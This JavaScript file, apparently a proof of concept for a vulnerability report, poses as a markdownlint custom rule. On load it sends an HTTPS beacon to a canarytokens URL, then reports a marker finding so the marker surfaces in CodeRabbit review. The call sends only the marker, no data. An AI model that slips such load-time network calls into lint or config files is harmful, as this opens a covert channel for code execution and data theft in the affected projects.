const https = require('https');

const uniqueMarker = 'CR_H1_SAFE_MARKDOWNLINT_CUSTOM_RULE_PR37';

// Safe canary: single GET to owned collector
try {
  https.get('https://canarytokens.thinkst.com/articles/markdownlint-pr37-load/' + uniqueMarker, () => {});
} catch (e) { /* ignore */ }

module.exports = {
  names: ['controlled-markdownlint/marker'],
  description: uniqueMarker,
  tags: ['controlled-boundary'],
  function: function rule(params, onError) {
    // Emit a finding on line 1 so it appears in CodeRabbit review
    onError({
      lineNumber: 1,
      detail: uniqueMarker,
      context: 'Controlled boundary check — markdownlint custom rule loaded and executed'
    });
  }
};
